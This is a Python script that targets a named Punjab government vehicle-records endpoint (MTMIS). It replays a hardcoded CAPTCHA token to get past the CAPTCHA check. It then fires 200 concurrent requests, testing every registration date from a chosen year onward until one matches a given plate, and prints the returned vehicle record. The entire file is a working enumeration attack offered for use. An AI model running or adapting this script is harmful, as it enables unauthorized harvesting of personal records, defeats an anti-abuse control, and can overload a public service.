import asyncio
import aiohttp
import json
from datetime import datetime, timedelta

TARGET_URL = "https://mtmis.excise.punjab.gov.pk/gtw/Public/Mtmis/GetVehicleInfoByRegNoAndDate"
CONCURRENCY_LIMIT = 200  # Pushed to 200 concurrent requests for maximum speed

# Static CAPTCHA credentials provided by operator
STATIC_CAPTCHA_INPUT = "278982"
STATIC_CAPTCHA_TOKEN = "0UDCfjFTbNP1Fi67bMthwzfj94kAGsX5894hGC3j_j4XqiuuthU8tRyNXFjdvhQpYLHqC3753hdHrBPmb5_cVQ"
STATIC_CAPTCHA_TEXT = "neBwwveeyD8ZeE5mPcfUFg"

def generate_date_permutations(start_year):
    dates = []
    start_date = datetime(start_year, 1, 1)
    end_date = datetime.now()
    
    curr = start_date
    while curr <= end_date:
        dates.append(curr.strftime("%Y-%m-%d"))
        curr += timedelta(days=1)
    return dates

async def test_date(session, reg_no, date_str, semaphore):
    async with semaphore:
        data = aiohttp.FormData()
        data.add_field('registrationNo', reg_no)
        data.add_field('registrationDate', date_str)
        data.add_field('dntCaptchaInputText', STATIC_CAPTCHA_INPUT)
        data.add_field('dntCaptchaToken', STATIC_CAPTCHA_TOKEN)
        data.add_field('dntCaptchaText', STATIC_CAPTCHA_TEXT)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://mtmis.excise.punjab.gov.pk",
            "Referer": "https://mtmis.excise.punjab.gov.pk/"
        }

        try:
            async with session.post(TARGET_URL, data=data, headers=headers, timeout=5) as response:
                if response.status == 200:
                    text = await response.text()
                    if "Vehicle data found" in text or "success" in text.lower():
                        return date_str, text
        except Exception:
            pass
        return None

async def main():
    print("==================================================")
    print("  MTMIS Punjab Ultra-High-Throughput Engine (200 req/s)")
    print("==================================================")
    
    reg_input = input("Enter License Plate Number (e.g., LDK-13-9900): ").strip().upper()
    if not reg_input:
        reg_input = "LDK-13-9900"
        
    year_input_str = input("Enter Vehicle Start Year / Release Year (e.g., 2013): ").strip()
    try:
        start_year = int(year_input_str)
    except ValueError:
        start_year = 2013

    dates = generate_date_permutations(start_year)
    print(f"\n[*] Target Plate: {reg_input}")
    print(f"[*] Generated {len(dates)} date permutations from {start_year}-01-01 to present.")
    print(f"[*] Dispatching aggressive 200 concurrency burst...")
    
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    connector = aiohttp.TCPConnector(
        limit=CONCURRENCY_LIMIT,
        limit_per_host=CONCURRENCY_LIMIT,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        batch_size = 200
        tested_count = 0
        for i in range(0, len(dates), batch_size):
            batch = dates[i:i + batch_size]
            tasks = [test_date(session, reg_input, d, semaphore) for d in batch]
            
            results = await asyncio.gather(*tasks)
            for res in results:
                tested_count += 1
                if res:
                    date_found, response_text = res
                    print(f"\n\n[+] SUCCESS! Match verified on date: {date_found}")
                    print(f"Response Data:\n{json.dumps(json.loads(response_text), indent=2)}")
                    return

            print(f"[*] Tested up to date: {batch[-1]} (Total tested: {tested_count})", end="\r")

    print("\n\n[-] Enumeration completed across all dates. No match found.")

if __name__ == "__main__":
    asyncio.run(main())